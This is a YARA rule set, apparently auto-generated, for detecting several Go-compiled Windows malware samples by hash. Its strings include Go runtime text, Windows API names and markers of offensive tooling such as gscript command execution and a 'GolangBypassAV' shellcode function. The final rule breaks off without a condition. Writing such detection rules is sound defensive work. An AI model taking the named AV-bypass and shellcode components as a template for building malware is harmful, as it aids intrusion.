/*
   YARA Rule Set
   Author: Omar Abusabha
   Date: 2023-06-30
   Identifier: dataset
   Reference: reference.txt
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad {
   meta:
      description = "dataset - file 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
   strings:
      $x1 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '73.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '64.50'*/
      $x3 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x4 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '55.00'*/
      $x5 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '55.00'*/
      $x6 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x7 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x8 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x9 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '48.00'*/
      $x10 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock," ascii /* score: '47.00'*/
      $x11 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCertGetNameStringWCloseServiceHandleCo" ascii /* score: '42.00'*/
      $x12 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '41.00'*/
      $x13 = "garbage collection scangcDrain phase incorrectgo with non-empty frameindex out of range [%x]interrupted system callinvalid m->lo" ascii /* score: '40.00'*/
      $x14 = " is currently not supported for use in system callbacksSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner:" ascii /* score: '39.00'*/
      $x15 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitAddDllDirectoryCLSIDFromStringCreateHardLinkWDeviceIoControlDuplicat" ascii /* score: '37.00'*/
      $x16 = "EnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWbad flushGen b" ascii /* score: '34.00'*/
      $x17 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x18 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '32.00'*/
      $x19 = " p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  " ascii /* score: '31.00'*/
      $s20 = " untyped locals , not a function0123456789ABCDEF0123456789abcdef2384185791015625CreateDirectoryWCreateJobObjectWCryptProtectData" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*)
}

rule sig_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89 {
   meta:
      description = "dataset - file 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
   strings:
      $x1 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '73.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '64.50'*/
      $x3 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x4 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '55.00'*/
      $x5 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '55.00'*/
      $x6 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x7 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x8 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x9 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '48.00'*/
      $x10 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock," ascii /* score: '47.00'*/
      $x11 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCertGetNameStringWCloseServiceHandleCo" ascii /* score: '42.00'*/
      $x12 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '41.00'*/
      $x13 = "DBmz5l5knlTekyxYAgNf0a4WdTy5QKsZPL2qp3setakY/esh0zzJtywmkATvb2AlrmWAsC4Rfk7wQqoxXc9MPRaCOrIjWJPALRtkY/SFR9LY5w90z0/ZETiXZpou6HlU" ascii /* score: '41.00'*/
      $x14 = "garbage collection scangcDrain phase incorrectgo with non-empty frameindex out of range [%x]interrupted system callinvalid m->lo" ascii /* score: '40.00'*/
      $x15 = " is currently not supported for use in system callbacksSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner:" ascii /* score: '39.00'*/
      $x16 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitAddDllDirectoryCLSIDFromStringCreateHardLinkWDeviceIoControlDuplicat" ascii /* score: '37.00'*/
      $x17 = "EnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWbad flushGen b" ascii /* score: '34.00'*/
      $x18 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x19 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '32.00'*/
      $x20 = " p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  " ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*)
}

rule sig_83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc {
   meta:
      description = "dataset - file 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
   strings:
      $x1 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '73.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625C:\\Windows\\System32\\notepad.exeC" ascii /* score: '69.50'*/
      $x3 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x4 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '55.00'*/
      $x5 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '55.00'*/
      $x6 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x7 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x8 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x9 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '48.00'*/
      $x10 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock," ascii /* score: '47.00'*/
      $x11 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCertGetNameStringWCloseServiceHandleCo" ascii /* score: '42.00'*/
      $x12 = "structure needs cleaningvImzAmUG7vWjA1A9k3pyvA==zlib: invalid dictionary bytes failed with errno= to unused region of span with " ascii /* score: '41.00'*/
      $x13 = "garbage collection scangcDrain phase incorrectgo with non-empty frameindex out of range [%x]interrupted system callinvalid m->lo" ascii /* score: '40.00'*/
      $x14 = " is currently not supported for use in system callbacksSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner:" ascii /* score: '39.00'*/
      $x15 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitAddDllDirectoryCLSIDFromStringCreateHardLinkWDeviceIoControlDuplicat" ascii /* score: '37.00'*/
      $x16 = "EnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWbad flushGen b" ascii /* score: '34.00'*/
      $x17 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x18 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '32.00'*/
      $x19 = " p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  " ascii /* score: '31.00'*/
      $s20 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*)
}

rule sig_7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966 {
   meta:
      description = "dataset - file 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
   strings:
      $x1 = " > (den<<shift)/2unreserving unaligned region45474735088646411895751953125C:\\Windows\\System32\\ntdll.dllCentral America Standa" ascii /* score: '73.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '64.50'*/
      $x3 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '63.00'*/
      $x4 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x5 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '55.00'*/
      $x6 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '55.00'*/
      $x7 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x8 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x9 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x10 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing" ascii /* score: '47.00'*/
      $x11 = "EnumKeyExWRegEnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWb" ascii /* score: '41.00'*/
      $x12 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '41.00'*/
      $x13 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '40.00'*/
      $x14 = "C:\\Windows\\System32\\cmd.exe" fullword wide /* score: '38.00'*/
      $x15 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitAddDllDirectoryCLSIDFromStringCreateHardLinkWDeviceIoControlDuplicat" ascii /* score: '37.00'*/
      $x16 = "00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263" ascii /* score: '34.00'*/
      $x17 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x18 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner: SplitFunc returns negative advance countcasfrom_Gscans" ascii /* score: '34.00'*/
      $x19 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '32.00'*/
      $x20 = " P runtime: p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] a" ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*)
}

rule sig_4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7 {
   meta:
      description = "dataset - file 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
   strings:
      $x1 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '73.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '64.50'*/
      $x3 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x4 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '55.00'*/
      $x5 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '55.00'*/
      $x6 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x7 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x8 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x9 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '48.00'*/
      $x10 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock," ascii /* score: '47.00'*/
      $x11 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCertGetNameStringWCloseServiceHandleCo" ascii /* score: '42.00'*/
      $x12 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '41.00'*/
      $x13 = "garbage collection scangcDrain phase incorrectgo with non-empty frameindex out of range [%x]interrupted system callinvalid m->lo" ascii /* score: '40.00'*/
      $x14 = " is currently not supported for use in system callbacksSOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner:" ascii /* score: '39.00'*/
      $x15 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitAddDllDirectoryCLSIDFromStringCreateHardLinkWDeviceIoControlDuplicat" ascii /* score: '37.00'*/
      $x16 = "EnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWbad flushGen b" ascii /* score: '34.00'*/
      $x17 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x18 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '32.00'*/
      $x19 = " p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  " ascii /* score: '31.00'*/
      $s20 = " untyped locals , not a function0123456789ABCDEF0123456789abcdef2384185791015625CreateDirectoryWCreateJobObjectWCryptProtectData" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*)
}

rule sig_78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35 {
   meta:
      description = "dataset - file 78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "78a59f5c6d8cd3f3cf0e70b565c8038844b34cba3e99b3fc63908821bdadce35"
   strings:
      $x1 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Already saw a default in switchCann" ascii /* score: '73.50'*/
      $x2 = "can't represent recursive pointer type gob: cannot encode nil pointer of type heapBitsSetTypeGCProg: small allocationmismatched " ascii /* score: '72.50'*/
      $x3 = " of unexported method previous allocCount=([eE][\\+\\-])0+([1-9])1862645149230957031252006-01-02T15:04-07002006-01T15:04:05-0700" ascii /* score: '56.00'*/
      $x4 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)toPrecision() precision must be grea" ascii /* score: '54.50'*/
      $x5 = " > (den<<shift)/2unexpected end of JSON input cannot be converted to type 45474735088646411895751953125Central America Standard " ascii /* score: '53.00'*/
      $x6 = "version mismatchworkbuf is empty initialHeapLive= spinningthreads=%%!%c(big.Int=%s)%s: Line %d:%d %s0123456789ABCDEFX0123456789a" ascii /* score: '51.50'*/
      $x7 = "15258789062515:04:05 MST2014-04-13/1762939453125Bidi_ControlFindNextFileGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHa" ascii /* score: '48.00'*/
      $x8 = " returned zero Value to unallocated span%%!%c(*big.Float=%s)%v is not a function2006-01T15:04:05.00037252902984619140625Arabic S" ascii /* score: '47.00'*/
      $x9 = " gcwaiting= gp.status= heap_live= idleprocs= in status  m->mcache= mallocing= ms clock,  nBSSRoots= p->mcache= p->status= pageSi" ascii /* score: '46.00'*/
      $x10 = "Unterminated groupVariation_Selector[^\\x00-\\x{10FFFF}][object Undefined]bad lfnode addressbad manualFreeListbufio: buffer full" ascii /* score: '42.00'*/
      $x11 = "runtime.SetFinalizer: pointer not at beginning of allocated blockstrconv: internal error: extFloat.FixedDecimal called with n ==" ascii /* score: '42.00'*/
      $x12 = "Pakistan Standard TimeParaguay Standard TimeRat.Scan: invalid verbSakhalin Standard TimeTasmania Standard Time[0-9eE\\+\\-\\.]|I" ascii /* score: '42.00'*/
      $x13 = " lockedg= lockedm= m->curg= ms cpu,  not in [ of type  runtime= s.limit= s.state= threads= u_a/u_g= wbuf1.n= wbuf2.n=(unknown)+i" ascii /* score: '40.00'*/
      $x14 = "github.com/gen0cide/gscript/stdlib/exec.ExecuteCommand" fullword ascii /* score: '39.00'*/
      $x15 = "github.com/gen0cide/gscript/stdlib/exec.ExecuteCommandAsync" fullword ascii /* score: '39.00'*/
      $x16 = "github.com/gen0cide/gscript/logger/null.(*Logger).Errorln" fullword ascii /* score: '36.00'*/
      $x17 = "github.com/gen0cide/gscript/logger/null.(*Logger).Error" fullword ascii /* score: '36.00'*/
      $x18 = "github.com/gen0cide/gscript/logger/null.(*Logger).Errorf" fullword ascii /* score: '36.00'*/
      $x19 = "github.com/gen0cide/gscript/logger/null.(*Logger).Infof" fullword ascii /* score: '33.00'*/
      $x20 = "github.com/gen0cide/gscript/logger/null.(*Logger).Printf" fullword ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 19000KB and
      1 of ($x*)
}

rule sig_89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd {
   meta:
      description = "dataset - file 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
   strings:
      $x1 = " > (den<<shift)/2unreserving unaligned region45474735088646411895751953125C:\\Windows\\System32\\ntdll.dllCentral America Standa" ascii /* score: '73.00'*/
      $x2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '64.50'*/
      $x3 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '63.00'*/
      $x4 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWChangeServiceConfigWCheckTok" ascii /* score: '62.00'*/
      $x5 = "152587890625762939453125Bidi_ControlCoCreateGuidCreateEventWCreateMutexWErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '55.00'*/
      $x6 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '55.00'*/
      $x7 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '52.00'*/
      $x8 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x9 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '49.00'*/
      $x10 = "unknown pcuser32.dllws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status  mallocing" ascii /* score: '47.00'*/
      $x11 = "EnumKeyExWRegEnumValueWRegOpenKeyExWRtlGetVersionShellExecuteWStartServiceWThread32FirstVirtualUnlockWTSFreeMemoryWriteConsoleWb" ascii /* score: '41.00'*/
      $x12 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '41.00'*/
      $x13 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '40.00'*/
      $x14 = ",M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitAddDllDirectoryCLSIDFromStringCreateHardLinkWDeviceIoControlDuplicat" ascii /* score: '37.00'*/
      $x15 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticIsValidSidKharoshthiLockFileExManichaeanOld_ItalicOld_PermicOld_TurkicOpenEventWOpenMute" ascii /* score: '34.00'*/
      $x16 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zonesbufio.Scanner: SplitFunc returns negative advance countcasfrom_Gscans" ascii /* score: '34.00'*/
      $x17 = "00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263" ascii /* score: '34.00'*/
      $x18 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '32.00'*/
      $x19 = " P runtime: p scheddetailsechost.dllsecur32.dllshell32.dllshort writetracealloc(unreachableuserenv.dll KiB total,  [recovered] a" ascii /* score: '31.00'*/
      $s20 = "1907348632812595367431640625CertCloseStoreControlServiceCreateEventExWCreateMutexExWCreateProcessWCreateServiceWCryptGenRandomCu" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*)
}

rule b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991 {
   meta:
      description = "dataset - file b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
   strings:
      $x1 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '70.50'*/
      $x2 = "non-IPv4 addressnon-IPv6 addressobject is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = " ascii /* score: '69.00'*/
      $x3 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '65.50'*/
      $x4 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '64.00'*/
      $x5 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '52.00'*/
      $x6 = "unixpacketunknown pcuser-agentws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= heap_live= idleprocs= in status " ascii /* score: '51.00'*/
      $x7 = "152587890625762939453125Bidi_ControlCIDR addressCONTINUATIONContent TypeContent-TypeGetAddrInfoWGetConsoleCPGetLastErrorGetLengt" ascii /* score: '50.00'*/
      $x8 = " > (den<<shift)/2unreserving unaligned region45474735088646411895751953125Central America Standard TimeCentral Pacific Standard " ascii /* score: '49.00'*/
      $x9 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnablestrict-trans" ascii /* score: '46.00'*/
      $x10 = "GOMAXPROCSGetIfEntryGetVersionGlagoliticHTTP_PROXYKeep-AliveKharoshthiLockFileExManichaeanNo ContentOld_ItalicOld_PermicOld_Turk" ascii /* score: '46.00'*/
      $x11 = "()<>@,;:\\\"/[]?=,M3.2.0,M11.1.0476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed" ascii /* score: '39.00'*/
      $x12 = "streamSafe was not resetstructure needs cleaningtext/html; charset=utf-8 bytes failed with errno= to unused region of span with " ascii /* score: '38.00'*/
      $x13 = "entersyscallgcBitsArenasgcpacertracegetaddrinfowhost is downhttp2debug=1http2debug=2illegal seekinvalid baseinvalid portinvalid " ascii /* score: '38.00'*/
      $x14 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '35.50'*/
      $x15 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= stream=%d sweepgen  sweepgen= targetpc= throwi" ascii /* score: '34.00'*/
      $s16 = "GolangBypassAV/encry.GetShellCode" fullword ascii /* score: '30.00'*/
